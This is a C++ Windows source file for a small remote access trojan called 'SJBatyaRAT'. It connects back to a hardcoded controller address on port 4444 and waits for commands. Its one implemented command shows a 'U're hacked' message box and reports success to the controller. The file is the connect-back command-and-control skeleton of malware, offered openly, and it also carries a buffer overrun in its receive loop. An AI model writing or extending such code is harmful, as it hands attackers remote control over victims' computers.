#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>
#include <stdexcept>
#include <stdio.h>
#include <string.h>
#include <tchar.h>
#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char* argv[])
{
    char* ip_addr = "192.168.31.135";
    int port = 4444;

    // Startup WinSock
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0)
    {
        printf("WinSock startup failed\n");
        exit(1);
    }

    SOCKADDR_IN addr;
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(4444); // port
    addr.sin_family = AF_INET; // IPv4

    SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL);
    if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
        printf("Failed to connect\n%d\n", WSAGetLastError());
        system("pause");
        exit(1);
    }
    printf("connected\n");

    char buff[1024];
    while (true)
    {
        int bytesReceived = recv(Connection, buff, sizeof(buff), 0);
        if (bytesReceived > 0) 
        {
            buff[bytesReceived] = '\0';
            std::string command(buff);
            if (command == "msgbox") {
                MessageBox(NULL, "U're hacked by SJBtyaRAT!", "SJBatyaRAT", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
                
                std::string callback = "Message box was summoned!";
                send(Connection, callback.c_str(), callback.size(), 0);
            }
        }
    }

    system("pause");
}